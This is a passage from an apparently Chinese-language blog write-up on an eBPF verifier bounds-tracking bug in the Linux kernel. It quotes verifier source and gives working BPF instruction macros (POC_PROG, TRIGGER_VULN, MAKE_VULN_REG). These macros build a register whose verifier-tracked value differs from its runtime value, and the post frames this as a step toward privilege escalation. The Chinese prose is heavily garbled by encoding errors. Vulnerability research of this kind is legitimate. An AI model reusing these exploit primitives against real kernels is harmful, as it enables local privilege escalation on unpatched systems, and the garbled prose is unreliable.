reg-&gt;u32_max_value;<br>&#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __reg64_deduce_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-comment">/* Learn sign from signed bounds.</span><br><span class="hljs-comment"> * If we cannot cross the sign boundary, then signed and unsigned bounds</span><br><span class="hljs-comment"> * are the same, so combine.  This works even in the negative case, e.g.</span><br><span class="hljs-comment"> * -3 s&lt;= x s&lt;= -1 implies 0xf...fd u&lt;= x u&lt;= 0xf...ff.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (reg-&gt;smin_value &gt;= <span class="hljs-number">0</span> || reg-&gt;smax_value &lt; <span class="hljs-number">0</span>) &#123;<br>reg-&gt;smin_value = reg-&gt;umin_value = <span class="hljs-type">max_t</span>(u64, reg-&gt;smin_value,<br>  reg-&gt;umin_value);<br>reg-&gt;smax_value = reg-&gt;umax_value = <span class="hljs-type">min_t</span>(u64, reg-&gt;smax_value,<br>  reg-&gt;umax_value);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">/* Learn sign from unsigned bounds.  Signed bounds cross the sign</span><br><span class="hljs-comment"> * boundary, so we must be careful.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> ((s64)reg-&gt;umax_value &gt;= <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* Positive.  We can&#x27;t learn anything from the smin, but smax</span><br><span class="hljs-comment"> * is positive, hence safe.</span><br><span class="hljs-comment"> */</span><br>reg-&gt;smin_value = reg-&gt;umin_value;<br>reg-&gt;smax_value = reg-&gt;umax_value = <span class="hljs-type">min_t</span>(u64, reg-&gt;smax_value,<br>  reg-&gt;umax_value);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((s64)reg-&gt;umin_value &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* Negative.  We can&#x27;t learn anything from the smax, but smin</span><br><span class="hljs-comment"> * is negative, hence safe.</span><br><span class="hljs-comment"> */</span><br>reg-&gt;smin_value = reg-&gt;umin_value = <span class="hljs-type">max_t</span>(u64, reg-&gt;smin_value,<br>  reg-&gt;umin_value);<br>reg-&gt;smax_value = reg-&gt;umax_value;<br>&#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __reg_deduce_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br>__reg32_deduce_bounds(reg);<br>__reg64_deduce_bounds(reg);<br>&#125;<br><br></code></pre></td></tr></table></figure><p> <code>__reg_bound_offset()</code> åˆ™æ˜¯åŸºäºè¾¹ç•Œå€¼èŒƒå›´é‡æ–°è®¡ç®— <code>var_off</code> çš„å€¼ï¼š</p><ul><li><code>tnum_range()</code>ï¼šå– min ä¸­ minã€max çš„ä½ä½ç›¸åŒä½éƒ¨åˆ†ï¼Œä»ç¬¬ä¸€ä¸ªä¸åŒä½å¼€å§‹è®¾ä¸ºæœªçŸ¥</li><li><code>tnum_intersect()</code>ï¼šå– aã€b çš„å…±æœ‰å·²çŸ¥ä¸º 1 çš„ä½</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> tnum <span class="hljs-title function_">tnum_range</span><span class="hljs-params">(u64 min, u64 max)</span><br>&#123;<br>u64 chi = min ^ max, delta;<br>u8 bits = fls64(chi); <span class="hljs-comment">// æ‰¾åˆ°ä¸º 1 çš„æœ€ä½ä½</span><br><br><span class="hljs-comment">/* ç‰¹æ®Šæƒ…å†µï¼Œ éœ€è¦è¿™æ ·å› ä¸º 1ULL &lt;&lt; 64 æ˜¯æœªå®šä¹‰çš„ */</span><br><span class="hljs-keyword">if</span> (bits &gt; <span class="hljs-number">63</span>)<br><span class="hljs-keyword">return</span> tnum_unknown;<br><span class="hljs-comment">/* ä¾‹å¦‚è‹¥ chi = 4, bits = 3, delta = (1&lt;&lt;3) - 1 = 7.</span><br><span class="hljs-comment"> * è‹¥ chi = 0, bits = 0, delta = (1&lt;&lt;0) - 1 = 0, </span><br><span class="hljs-comment"> *  æ•…æˆ‘ä»¬è¿”å›å¸¸æ•° min (å› ä¸º min == max).</span><br><span class="hljs-comment"> */</span><br>delta = (<span class="hljs-number">1ULL</span> &lt;&lt; bits) - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> TNUM(min &amp; ~delta, delta);<br>&#125;<br><br><span class="hljs-comment">/* éœ€è¦æ³¨æ„çš„æ˜¯è‹¥ a ä¸ b ä¸åŒæ„ - å³å…¶ä¸€æœ‰ä¸€ä¸ª &#x27;known 1&#x27; è€Œå¦ä¸€ä¸ªåˆ™</span><br><span class="hljs-comment"> * æœ‰ä¸€ä¸ª &#x27;known 0&#x27; - è¿™å°†ä¸ºè¯¥ä½è¿”å›ä¸€ä¸ª &#x27;known 1&#x27;.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">struct</span> tnum <span class="hljs-title function_">tnum_intersect</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tnum a, <span class="hljs-keyword">struct</span> tnum b)</span><br>&#123;<br>u64 v, mu;<br><br>v = a.value | b.value;<br>mu = a.mask &amp; b.mask;<br><span class="hljs-keyword">return</span> TNUM(v &amp; ~mu, mu);<br>&#125;<br><br><span class="hljs-comment">/* å°è¯•åŸºäºæ— ç¬¦å·æœ€å°/æœ€å¤§å€¼æ”¹è¿› var_off ä¿¡æ¯ */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __reg_bound_offset(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">var64_off</span> =</span> tnum_intersect(reg-&gt;var_off,<br>       tnum_range(reg-&gt;umin_value,<br>  reg-&gt;umax_value));<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">var32_off</span> =</span> tnum_intersect(tnum_subreg(reg-&gt;var_off),<br>tnum_range(reg-&gt;u32_min_value,<br>   reg-&gt;u32_max_value));<br><br>reg-&gt;var_off = tnum_or(tnum_clear_subreg(var64_off), var32_off);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸¤ä¸ªæ“ä½œåœ¨è¿™é‡Œéƒ½ä¸ä¼šå½±å“ R2 çš„å€¼</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>ç°åœ¨æˆ‘ä»¬æ¥æ„é€ èƒ½å¤Ÿè§¦å‘è¯¥æ¼æ´çš„ä¸¤ä¸ªå¯„å­˜å™¨ <code>R2 = &#123; .value = 1, mask = 0xffffffff00000000 &#125;</code> ä¸ <code>R3 = &#123; .value = 0x100000002, mask = 0 &#125;</code>ï¼Œå…¶ä¸­ <code>R3</code> å¯ä»¥ç›´æ¥é€šè¿‡èµ‹å€¼æ„é€ ä¸€ä¸ª known çš„å¯„å­˜å™¨ï¼Œ <code>R2</code> éœ€è¦ä¸€åŠå·²çŸ¥ä¸€åŠæœªçŸ¥ï¼Œå¯ä»¥é€šè¿‡ <em>ä» map ä¸­å–å‡ºä¸€ä¸ªå€¼è¿›è¡Œèµ‹å€¼</em> çš„æ–¹å¼å…ˆæ„é€ å‡ºä¸€ä¸ª unknown çš„å¯„å­˜å™¨ï¼Œå†ä¸ <code>0xffffffff00000000</code> åš AND æ“ä½œä½¿å…¶ä½ 32 ä½å˜ä¸º knownï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> POC_PROG(__map_fd)                              \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* Load value from map */</span>                       \</span><br><span class="hljs-meta">        BPF_LD_MAP_FD(BPF_REG_9, __map_fd),             \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),            \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),          \</span><br><span class="hljs-meta">        BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),            \</span><br><span class="hljs-meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* if success, r0 will be ptr to value, 0 for failed */</span>              \</span><br><span class="hljs-meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),          \</span><br><span class="hljs-meta">        BPF_EXIT_INSN(),                                \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* load value into r2, make it part-unknown */</span>  \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0),   \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_4, 0xffffffff),           \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_2, BPF_REG_4),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 0x1),         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* r3 = 0x100000002 */</span>                          \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_3, 0x1),                  \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, 0x2),         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* triger the vulnerability */</span>                  \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_2, BPF_REG_3)</span><br></code></pre></td></tr></table></figure><p>æŠŠè¿™ä¸ªç¨‹åºè½½å…¥å†…æ ¸è¿‡ä¸€é verifierï¼Œç®€å•æ‰“å°ä¸‹æ—¥å¿—ï¼Œå¯ä»¥çœ‹åˆ°<strong>æˆ‘ä»¬ç¡®ä¹æ„é€ å‡ºäº†ä¸€ä¸ªæœ€å°è¾¹ç•Œå€¼ä¸º 1ã€æœ€å¤§è¾¹ç•Œå€¼ä¸º 0 çš„å¯„å­˜å™¨</strong>ï¼š</p><p><img src="https://s2.loli.net/2023/06/02/br1XJgjKeFR6pOq.png" alt="æµ‹è¯• poc"></p><h1 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02. æ¼æ´åˆ©ç”¨"></a>0x02. æ¼æ´åˆ©ç”¨</h1><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å¦‚ä½•åˆ©ç”¨è¿™ä¸ªæ¼æ´å®Œæˆææƒï¼Œç°åœ¨æˆ‘ä»¬æœ‰äº†ä¸€ä¸ª 32 ä½è¾¹ç•Œå€¼ä¸º <code>[1ï¼Œ0]</code> ã€32ä½æ¨æµ‹å€¼ä¸32ä½è¿è¡Œæ—¶å€¼éƒ½ä¸º 0 çš„å¯„å­˜å™¨ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å¦‚ä½•æ„é€ ä¸€ä¸ª<strong>verifier æ¨æµ‹å€¼ä¸è¿è¡Œæ—¶å€¼ä¸åŒçš„å¯„å­˜å™¨</strong>ï¼Œä»è€Œç»§ç»­å®Œæˆåç»­åˆ©ç”¨</p><h2 id="ä¸€ã€æ„é€ è¾¹ç•Œå€¼ä¸º-1-0-çš„å¯„å­˜å™¨"><a href="#ä¸€ã€æ„é€ è¾¹ç•Œå€¼ä¸º-1-0-çš„å¯„å­˜å™¨" class="headerlink" title="ä¸€ã€æ„é€ è¾¹ç•Œå€¼ä¸º [1, 0] çš„å¯„å­˜å™¨"></a>ä¸€ã€æ„é€ è¾¹ç•Œå€¼ä¸º [1, 0] çš„å¯„å­˜å™¨</h2><p><strong>ç¬¬ä¸€æ­¥è¿˜æ˜¯å…ˆåˆ©ç”¨æ¼æ´æ„é€ ä¸€ä¸ªæœ€å°è¾¹ç•Œå€¼ä¸º 1ã€æœ€å¤§è¾¹ç•Œå€¼ä¸º 0 çš„å¯„å­˜å™¨</strong>ï¼Œå› ä¸º R1~R5 æœ‰çš„æ—¶å€™è¦ç”¨æ¥ä½œä¸ºå‡½æ•°å‚æ•°ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬æ”¹ä¸ºåœ¨ <code>R6</code> ä¸Šç»§ç»­æ„é€ </p><p>å› ä¸ºè¯»å– map çš„æ“ä½œä»£ç è¡Œæ•°å¤ªé•¿äº†ï¼ˆï¼‰ï¼Œæ‰€ä»¥ç¬”è€…ç°åœ¨ç»™ä»–å°è£…åˆ°ä¸€ä¸ª <code>BPF_READ_ARRAY_MAP_IDX()</code> å®é‡Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> VULN_REG BPF_REG_6</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, __dst_reg)                   \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* get a pointer to bpf_array */</span>                \</span><br><span class="hljs-meta">        BPF_LD_MAP_FD(BPF_REG_9, __map_fd),             \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),            \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),          \</span><br><span class="hljs-meta">        BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, __idx),        \</span><br><span class="hljs-meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* if success, r0 will be ptr to value, 0 for failed */</span>              \</span><br><span class="hljs-meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),          \</span><br><span class="hljs-meta">        BPF_EXIT_INSN(),                                \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* mov the result back and clear R0 */</span>          \</span><br><span class="hljs-meta">        BPF_MOV64_REG(__dst_reg, BPF_REG_0),            \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_0, 0)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRIGGER_VULN(__map_fd)                          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* load value into r2, make it part-unknown */</span>  \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, VULN_REG, BPF_REG_8, 0),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_4, 0xffffffff),           \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_4),    \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* r3 = 0x100000002 */</span>                          \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_3, 0x1),                  \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, 0x2),         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* triger the vulnerability */</span>                  \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_3)</span><br></code></pre></td></tr></table></figure><h2 id="äºŒã€æ„é€ è¿è¡Œæ—¶ä¸º-1ã€verifier-ç¡®ä¿¡ä¸º-0-çš„å¯„å­˜å™¨"><a href="#äºŒã€æ„é€ è¿è¡Œæ—¶ä¸º-1ã€verifier-ç¡®ä¿¡ä¸º-0-çš„å¯„å­˜å™¨" class="headerlink" title="äºŒã€æ„é€ è¿è¡Œæ—¶ä¸º 1ã€verifier ç¡®ä¿¡ä¸º 0 çš„å¯„å­˜å™¨"></a>äºŒã€æ„é€ è¿è¡Œæ—¶ä¸º 1ã€verifier ç¡®ä¿¡ä¸º 0 çš„å¯„å­˜å™¨</h2><p>æˆ‘ä»¬è¿˜æ˜¯è€ƒè™‘ç»§ç»­åœ¨ 32 ä½ä¸Šåšæ–‡ç« ï¼Œå‡å¦‚æˆ‘ä»¬æ„é€ å‡ºå¦ä¸€ä¸ª 32 ä½è¾¹ç•Œå€¼ä¸º <code>[0, 1]</code> ã€32ä½è¿è¡Œæ—¶å€¼ä¸º <code>0</code> å¯„å­˜å™¨ <code>R7</code>ï¼Œå°†è¿™ä¸ªå¯„å­˜å™¨ä¸æˆ‘ä»¬çš„ <code>R6</code> ç›¸åŠ ï¼Œå…¶è¾¹ç•Œå€¼è®¡ç®—å…¶å®å°±æ˜¯æ£€æŸ¥æ˜¯å¦æœ‰æº¢å‡ºç„¶åç®€å•çš„æŠŠä¸¤ä¸ªå¯„å­˜å™¨è¾¹ç•Œç›¸åŠ ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">scalar32_min_max_add</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_reg_state *dst_reg,</span><br><span class="hljs-params"> <span class="hljs-keyword">struct</span> bpf_reg_state *src_reg)</span><br>&#123;<br>s32 smin_val = src_reg-&gt;s32_min_value;<br>s32 smax_val = src_reg-&gt;s32_max_value;<br>u32 umin_val = src_reg-&gt;u32_min_value;<br>u32 umax_val = src_reg-&gt;u32_max_value;<br><br><span class="hljs-keyword">if</span> (signed_add32_overflows(dst_reg-&gt;s32_min_value, smin_val) ||<br>    signed_add32_overflows(dst_reg-&gt;s32_max_value, smax_val)) &#123;<br>dst_reg-&gt;s32_min_value = S32_MIN;<br>dst_reg-&gt;s32_max_value = S32_MAX;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>dst_reg-&gt;s32_min_value += smin_val;<br>dst_reg-&gt;s32_max_value += smax_val;<br>&#125;<br><span class="hljs-keyword">if</span> (dst_reg-&gt;u32_min_value + umin_val &lt; umin_val ||<br>    dst_reg-&gt;u32_max_value + umax_val &lt; umax_val) &#123;<br>dst_reg-&gt;u32_min_value = <span class="hljs-number">0</span>;<br>dst_reg-&gt;u32_max_value = U32_MAX;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>dst_reg-&gt;u32_min_value += umin_val;<br>dst_reg-&gt;u32_max_value += umax_val;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶æˆ‘ä»¬çš„å¯„å­˜å™¨ <code>R6</code> 32ä½è¾¹ç•Œå€¼ä¸º <code>[1, 1]</code>ï¼Œä¹‹å verifier ä¼šè°ƒç”¨ <code>__reg_bound_offset()</code> åå‘èµ‹å€¼ç»™ <code>var_off</code>ï¼Œæ­¤æ—¶æˆ‘ä»¬çš„ <code>var_off</code> çš„ 32 ä½å€¼ä¾¿ä¸º <code>1</code>ï¼Œä½†å®é™…ä¸Šçš„ 32 ä½å€¼ä¸º 0ï¼Œæˆ‘ä»¬ä¾¿è·å¾—äº†ä¸€ä¸ª<strong>è¿è¡Œæ—¶ä¸º 0 ã€verifier è®¤ä¸ºæ˜¯ 1 çš„å¯„å­˜å™¨</strong></p><p><img src="https://s2.loli.net/2023/06/03/C3PqmrvoNpFXJVc.png" alt="R6 += R7"></p><p>è¿™æ ·ä¸€ä¸ªå¯„å­˜å™¨å¥½åƒå¯¹æˆ‘ä»¬æ¥è¯´æ²¡æœ‰å¤ªå¤šä½œç”¨ï¼Œä½†å¦‚æœæˆ‘ä»¬å†ç»™ <code>R6</code> åŠ ä¸Š <code>1</code> ï¼Œä»è€Œä½¿å¾— 32 ä½ <code>var_off</code> å˜ä¸º <code>2</code>ï¼Œ<strong>ä½†å®é™…ä¸Šçš„ 32 ä½å€¼ä¸º 1</strong>ï¼Œæˆ‘ä»¬å†å°† <code>R6</code> ä¸ <code>1</code> åš <code>&amp;</code> è¿ç®—ï¼Œ<strong>verifier ä¾¿ä¼šè®¤ä¸ºè¯¥å¯„å­˜å™¨çš„å€¼å˜ä¸º 0ï¼Œä½†å…¶å®é™…ä¸Šçš„è¿è¡Œæ—¶å€¼ä¸º 1</strong></p><p><img src="https://s2.loli.net/2023/06/03/shRKgi38zScMfOe.png" alt="R6 += 1"></p><p><img src="https://s2.loli.net/2023/06/03/UBW2qvyrlsVax4I.png" alt="verifier:0, runtime:1"></p><p>æœ‰äº†è¿™æ ·ä¸€ä¸ªå¯„å­˜å™¨ï¼Œåé¢æˆ‘ä»¬å°±å¯ä»¥å¼€å§‹ä¸ºæ‰€æ¬²ä¸ºäº†ï¼šï¼‰</p><p>å¯¹äº <code>R7</code> çš„æ„é€ ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆä» map ä¸­å–å€¼è·å–ä¸€ä¸ª verifier å…¨ä¸å¯çŸ¥çš„å¯„å­˜å™¨ï¼Œä¹‹ååˆ©ç”¨ 32 ä½åˆ¤æ–­è·³è½¬æŒ‡ä»¤ <code>BPF_JMP32_IMM(BPF_JLE, BPF_REG_7, 1, 2)</code> ä½¿å…¶å˜ä¸º <code>&#123; .var_off = 0, .mask = 0xffffffff00000001&#125;</code> å³å¯ï¼Œmap ä¸­çš„å€¼æ˜¯æˆ‘ä»¬å¯æ§çš„æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿å…¶è¿è¡Œæ—¶å€¼ä¸º 0 ï¼š</p><blockquote><p>æ³¨ï¼šä½ ä¹Ÿå¯ä»¥å…ˆç»™ R6 +&#x3D; 1 å† R6 &amp;&#x3D; R7ï¼Œæ•ˆæœæ˜¯ä¸€æ ·çš„</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAKE_VULN_REG(__map_fd)                         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* load value into r3, make it [0, 1] under 32 bit */</span>                \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),   \</span><br><span class="hljs-meta">        BPF_JMP32_IMM(BPF_JLE, BPF_REG_7, 1, 2),        \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                    \</span><br><span class="hljs-meta">        BPF_EXIT_INSN(),                                \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_ADD, VULN_REG, BPF_REG_7),    \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_AND, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_0, 0)</span><br></code></pre></td></tr></table></figure><blockquote><p>å¯èƒ½å¤§å®¶ä¼šæƒ³åˆ°å¯¹äºæ¡ä»¶è·³è½¬æŒ‡ä»¤è€Œè¨€ verifier ä¸»è¦æ ¹æ®è¾¹ç•Œå€¼è¿›è¡Œåˆ¤æ–­ï¼Œæˆ–è®¸æˆ‘ä»¬èƒ½å¤Ÿæ„é€ ä¸€ä¸ªè¿è¡Œæ—¶ä¸ºçœŸä½† verifier è®¤ä¸ºå‡çš„æ¡ä»¶è·³è½¬è¯­å¥ï¼ˆä¾‹å¦‚ <code>BPF_JMP32_IMM(BPF_JGE, BPF_REG_6, 1, 1)</code>ï¼‰å¹¶åœ¨ verifier è®¤ä¸ºæ’ä¸ºå‡ä½†è¿è¡Œæ—¶ä¸ºçœŸçš„åˆ†æ”¯ä¸­éšè—æ¶æ„æŒ‡ä»¤ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">is_branch32_taken</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_reg_state *reg, u32 val, u8 opcode)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">subreg</span> =</span> tnum_subreg(reg-&gt;var_off);<br>s32 sval = (s32)val;<br><br><span class="hljs-keyword">switch</span> (opcode) &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">case</span> BPF_JGE:<br><span class="hljs-keyword">if</span> (reg-&gt;u32_min_value &gt;= val)<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (reg-&gt;u32_max_value &lt; val)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>ä½†è¿™å¹¶ä¸æ˜¯ä¸€ä¸ªå¯è¡Œçš„æ–¹æ¡ˆï¼Œå› ä¸ºå¯¹äºä¸å¯è¾¾æŒ‡ä»¤ï¼ˆdead codeï¼‰ï¼Œ<strong>verifierä¼šå°†å…¶ patch ä¸ºè·³è½¬å›æ¡ä»¶åˆ†æ”¯æŒ‡ä»¤</strong>ï¼Œä»è€Œå¯¼è‡´æˆ‘ä»¬æ— æ³•åœ¨æ­¤å¤„è—å…¥æ¶æ„ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">sanitize_dead_code</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> 